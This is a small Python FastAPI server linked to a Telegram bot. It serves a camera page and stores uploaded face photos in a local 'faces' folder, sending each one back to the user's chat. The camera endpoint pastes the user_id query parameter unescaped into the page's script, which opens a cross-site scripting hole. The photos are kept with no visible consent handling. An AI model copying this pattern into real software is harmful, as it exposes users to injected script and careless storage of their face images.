from fastapi import FastAPI, File, UploadFile, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import os
import time
import aiofiles
from aiogram import Bot
import config

app = FastAPI()
bot = Bot(token=config.BOT_TOKEN)

app.mount("/static", StaticFiles(directory="templates"), name="static")

@app.get("/camera")
async def camera_page(request: Request):
    user_id = request.query_params.get("user_id", "0")
    with open("templates/camera.html", "r", encoding="utf-8") as f:
        html = f.read()
    # подставляем user_id в скрипт
    html = html.replace("{{USER_ID}}", user_id)
    return HTMLResponse(content=html, status_code=200)

@app.post("/upload_photo")
async def upload_photo(user_id: int = Form(...), photo: UploadFile = File(...)):
    os.makedirs("faces", exist_ok=True)
    filename = f"faces/{user_id}_{int(time.time())}.jpg"
    async with aiofiles.open(filename, "wb") as out_file:
        content = await photo.read()
        await out_file.write(content)
    try:
        await bot.send_photo(chat_id=user_id, photo=open(filename, "rb"), caption="📸 Ваше фото сохранено в логах.")
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)
    return JSONResponse({"status": "ok", "filename": filename})
